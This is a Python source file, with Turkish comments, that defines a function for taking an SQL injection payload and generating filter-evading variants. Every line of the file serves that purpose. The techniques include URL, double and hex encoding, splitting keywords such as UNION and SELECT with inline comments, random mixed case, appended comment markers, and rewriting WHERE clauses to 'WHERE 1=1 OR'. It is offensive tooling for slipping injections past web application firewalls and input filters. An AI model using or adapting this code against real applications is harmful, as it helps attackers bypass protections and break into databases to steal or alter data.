import urllib.parse
import random
import logging

def obfuscate_payloads(payload):
    """
    SQL enjeksiyon ifadelerini gizlemek için çeşitli yöntemler uygular.
    Döndürülen liste, farklı gizleme yöntemlerini içeren payload'lardan oluşur.
    """
    if not payload or not isinstance(payload, str):
        logging.error("Geçersiz payload verisi.")
        return []

    # Temel gizleme yöntemleri listesi
    obfuscations = [
        urllib.parse.quote(payload),  # URL encoding
        "".join([f"%{hex(ord(c))[2:]}" for c in payload]),  # ASCII kodlama
        "||".join(payload.split(" ")),  # '||' karakteriyle bölme
        payload.replace(" ", "/**/"),  # '/*...*/' kullanarak bölme
        payload + "--",  # SQL yorum satırı ekleme
        "/**/".join(payload.split(" ")),  # SQL yorumlu bölme
    ]

    # SQL enjeksiyon ifadeleri için özel gizleme
    sql_keywords = {
        "UNION": ["UNI/**/ON", "U/**/NION", "UN/**/ION"],
        "SELECT": ["SEL/**/ECT", "S/**/ELECT", "SE/**/LECT"],
        "INSERT": ["INS/**/ERT", "IN/**/SERT", "I/**/NSERT"],
        "UPDATE": ["UPD/**/ATE", "UP/**/DATE", "U/**/PDATE"],
        "DELETE": ["DEL/**/ETE", "D/**/ELETE", "DE/**/LETE"],
        "DROP": ["DR/**/OP", "D/**/ROP", "DROP/**/"],
        "WHERE": ["WHE/**/RE", "WH/**/ERE", "W/**/HERE"],
        "AND": ["A/**/ND", "AN/**/D", "AND/**/"],
        "OR": ["O/**/R", "OR/**/"],
        "FROM": ["FR/**/OM", "F/**/ROM", "FROM/**/"],
        "ORDER BY": ["ORD/**/ER BY", "ORDER/**/BY", "OR/**/DER BY"],
        "GROUP BY": ["GRO/**/UP BY", "GROUP/**/BY", "GR/**/OUP BY"],
        "HAVING": ["HAV/**/ING", "HA/**/VING", "HAVING/**/"],
        "JOIN": ["JO/**/IN", "J/**/OIN", "JOIN/**/"]
    }

    # Yukarıdaki SQL ifadeleri için payload üzerinde obfuscation işlemi
    for keyword, obf_versions in sql_keywords.items():
        if keyword in payload.upper():
            for obf_version in obf_versions:
                obfuscations.append(payload.upper().replace(keyword, obf_version))

    # Ek gizleme teknikleri
    mixed_case_payload = "".join(
        random.choice([char.upper(), char.lower()]) if char.isalpha() else char for char in payload
    )
    obfuscations.append(mixed_case_payload)

    spaced_payload = " ".join(payload)
    obfuscations.append(spaced_payload)

    sql_comment_payload = "".join(f"{char}--" if random.choice([True, False]) else char for char in payload)
    obfuscations.append(sql_comment_payload)

    # WHERE ifadesi varsa injection ekleme
    if "WHERE" in payload.upper():
        injection_payload = payload.replace("WHERE", "WHERE 1=1 OR")
        obfuscations.append(injection_payload)

    # Çift kodlama ve tersine çevirme eklenir
    double_encoding = urllib.parse.quote(urllib.parse.quote(payload))
    obfuscations.append(double_encoding)

    hex_encoding = "".join([f"\\x{ord(c):02x}" for c in payload])
    obfuscations.append(hex_encoding)

    reverse_payload = payload[::-1]
    obfuscations.append(reverse_payload)

    random.shuffle(obfuscations)
    return obfuscations
